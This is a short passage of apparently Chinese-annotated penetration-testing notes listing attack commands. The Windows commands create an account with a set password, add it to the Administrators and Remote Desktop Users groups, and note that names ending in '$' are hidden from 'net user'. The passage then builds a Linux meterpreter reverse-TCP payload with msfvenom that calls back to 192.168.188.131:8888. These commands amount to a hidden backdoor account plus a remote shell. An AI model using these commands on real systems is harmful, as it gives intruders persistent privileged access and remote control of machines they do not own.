...
```bash
net user a Abcd1234 /add                 # 添加用户
# Windows 的帐号名称后带着"$"符号时,不会在 net user 命令中显示出帐号信息


net localgroup administrators a /add  # 将用户添加到管理组

net localgroup "Remote Desktop Users" a /add    # 将用户添加到RDP
...
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.188.131 LPORT=8888 -f elf -o x86_linux.elf
